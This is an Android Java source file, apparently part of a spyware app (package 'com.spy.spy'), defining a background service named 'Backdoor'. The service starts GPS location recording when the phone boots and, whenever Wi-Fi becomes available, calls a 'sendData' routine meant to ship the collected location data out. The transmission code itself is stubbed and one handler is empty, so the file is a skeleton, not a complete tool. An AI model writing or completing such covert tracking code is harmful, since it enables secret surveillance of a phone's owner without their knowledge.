package com.spy.spy;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.IBinder;
public class Backdoor extends Service {
    final static String GPS_FULL="GPS_FULL";
    public Backdoor() {
    }
    InfoZipper infoZipper=new InfoZipper();
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //Toast.makeText(Auto.this, "sc start", Toast.LENGTH_SHORT).show();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        onAction(intent.getStringExtra("action"));
        return super.onStartCommand(intent, flags, startId);
    }

    void onAction(String action){
        switch (action){
            case WifiManager.SUPPLICANT_CONNECTION_CHANGE_ACTION:
                onWifiChange();
                break;
            case Intent.ACTION_BOOT_COMPLETED:
                onPhoneStart();
                break;
            case GPS_FULL:
                onGpsFull();
                break;
        }
    }

    void onPhoneStart(){
        infoZipper.startGpsRecord();
    }
    void onWifiChange(){
        WifiManager wifiManager=(WifiManager)this.getSystemService(WIFI_SERVICE);
        if(wifiManager.getWifiState()!=WifiManager.WIFI_STATE_ENABLED)
            return;
        sendData();
    }
    void sendData(){
        infoZipper.toString();
        infoZipper.gpsInfo();
    }
    void onGpsFull(){

    }
}
